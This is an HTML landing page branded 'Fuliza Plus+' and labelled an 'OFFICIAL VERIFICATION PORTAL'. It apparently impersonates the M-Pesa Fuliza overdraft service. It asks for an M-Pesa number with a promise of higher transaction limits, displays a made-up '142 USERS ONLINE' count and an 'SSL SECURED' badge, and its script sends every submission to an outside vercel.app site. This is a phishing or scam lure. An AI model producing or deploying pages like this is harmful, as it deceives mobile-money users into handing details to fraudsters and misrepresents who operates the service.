<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Fuliza Plus+</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: #f3f4f6;

  display: flex;
  justify-content: center;
  align-items: center;

  min-height: 100vh;
}

.card {
  background: white;
  padding: 20px;
  border-radius: 15px;
  width: 300px;
  text-align: center;
}

.icon img {
  width: 60px;
}

h1 {
  margin: 10px 0;
}

.sub {
  color: green;
  font-size: 12px;
}

.desc {
  font-size: 14px;
  margin: 10px 0;
}

.input-box {
  background: #f3f4f6;
  border-radius: 12px;
  padding: 12px;
  margin-bottom: 15px;
}

.input-box input {
  border: none;
  outline: none;
  background: transparent;
  width: 100%;
  font-size: 14px;
}

button {
  width: 100%;
  padding: 14px;
  background: #16a34a;
  color: white;
  border: none;
  border-radius: 12px;
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
}

button:hover {
  background: #15803d;
}

.footer {
  margin-top: 15px;
  font-size: 12px;
  color: #9ca3af;
}
</style>
</head>

<body>

<div class="card">

  <div class="icon">
    <img src="https://cdn-icons-png.flaticon.com/512/1077/1077114.png">
  </div>

  <h1>Fuliza Plus+</h1>
  <div class="sub">OFFICIAL VERIFICATION PORTAL</div>

  <div class="desc">
    Verify your identity to unlock higher daily transaction limits.
  </div>

  <form onsubmit="submitForm(event)">
    <div class="input-box">
      <input type="text" placeholder="Enter M-Pesa Number" required>
    </div>

    <button type="submit">
      Check My Eligibility >
    </button>
  </form>

  <div class="footer">
    • 142 USERS ONLINE &nbsp; | &nbsp; 🔒 SSL SECURED
  </div>

</div>

<script>
function submitForm(e){
  e.preventDefault();
  window.location.href = "https://hass-fuliza-boost.vercel.app";
}
</script>

</body>
</html>
